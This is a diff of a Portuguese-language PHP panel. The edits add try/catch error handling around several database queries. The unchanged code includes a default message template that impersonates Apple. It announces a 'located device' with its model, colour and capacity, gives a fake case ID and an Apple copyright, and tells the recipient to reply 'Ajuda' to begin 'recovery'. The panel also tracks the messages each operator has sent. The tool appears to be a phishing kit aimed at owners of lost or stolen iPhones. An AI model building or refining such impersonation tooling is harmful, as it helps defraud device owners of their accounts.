@@ -3,20 +3,32 @@ require_once 'config.php';
 checkAuth();
 
 // Fetch models
-$stmtModels = $pdo->query("SELECT id, nome FROM modelos ORDER BY nome");
-$modelos = $stmtModels->fetchAll(PDO::FETCH_ASSOC);
+$modelos = [];
+try {
+    $stmtModels = $pdo->query("SELECT id, nome FROM modelos ORDER BY nome");
+    $modelos = $stmtModels->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) { error_log("Erro ao buscar modelos: " . $e->getMessage()); }
 
 // Fetch colors
-$stmtColors = $pdo->query("SELECT id, nome FROM cores ORDER BY nome");
-$cores = $stmtColors->fetchAll(PDO::FETCH_ASSOC);
+$cores = [];
+try {
+    $stmtColors = $pdo->query("SELECT id, nome FROM cores ORDER BY nome");
+    $cores = $stmtColors->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) { error_log("Erro ao buscar cores: " . $e->getMessage()); }
 
 // Fetch Capacidades (GB/TB)
-$stmtCaps = $pdo->query("SELECT id, nome FROM capacidades ORDER BY CAST(nome AS UNSIGNED) ASC, nome ASC");
-$capacidades = $stmtCaps->fetchAll(PDO::FETCH_ASSOC);
+$capacidades = [];
+try {
+    $stmtCaps = $pdo->query("SELECT id, nome FROM capacidades ORDER BY CAST(nome AS UNSIGNED) ASC, nome ASC");
+    $capacidades = $stmtCaps->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) { error_log("Erro ao buscar capacidades: " . $e->getMessage()); }
 
 // Fetch uploaded/saved images
-$stmtImagens = $pdo->query("SELECT id, caminho FROM imagens_salvas ORDER BY caminho ASC");
-$imagensSalvas = $stmtImagens->fetchAll(PDO::FETCH_ASSOC);
+$imagensSalvas = [];
+try {
+    $stmtImagens = $pdo->query("SELECT id, caminho FROM imagens_salvas ORDER BY caminho ASC");
+    $imagensSalvas = $stmtImagens->fetchAll(PDO::FETCH_ASSOC);
+} catch (Exception $e) { error_log("Erro ao buscar imagens: " . $e->getMessage()); }
 
 $defaultText = "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy";
 
@@ -413,13 +425,20 @@ $baseTexts = [
                             <?php 
                             $loggedId = $_SESSION['user_id'] ?? 0;
                             $isAdmin = ($loggedId == 2);
-                            if ($isAdmin) {
-                                $stmtHist = $pdo->query("SELECT m.*, u.username FROM mensagens_enviadas m LEFT JOIN usuarios u ON m.user_id = u.id ORDER BY m.id DESC LIMIT 10");
-                            } else {
-                                $stmtHist = $pdo->prepare("SELECT id, numero, modelo, cor, data_hora, status FROM mensagens_enviadas WHERE user_id = ? ORDER BY id DESC LIMIT 10");
-                                $stmtHist->execute([$loggedId]);
+                            $history = []; // Initialize $history
+                            try {
+                                if ($isAdmin) {
+                                    $stmtHist = $pdo->query("SELECT m.*, u.username FROM mensagens_enviadas m LEFT JOIN usuarios u ON m.user_id = u.id ORDER BY m.id DESC LIMIT 10");
+                                } else {
+                                    $stmtHist = $pdo->prepare("SELECT id, numero, modelo, cor, data_hora, status FROM mensagens_enviadas WHERE user_id = ? ORDER BY id DESC LIMIT 10");
+                                    $stmtHist->execute([$loggedId]);
+                                }
+                                $history = $stmtHist->fetchAll(PDO::FETCH_ASSOC);
+                            } catch (Exception $e) {
+                                error_log("Erro ao buscar histórico: " . $e->getMessage());
+                                // Optionally, you could set a user-friendly message here
+                                // $history = []; // Ensure it's empty if an error occurred
                             }
-                            $history = $stmtHist->fetchAll(PDO::FETCH_ASSOC);
                             
                             foreach ($history as $h): 
                                 $isPaused = ($h['status'] === 'pausado');
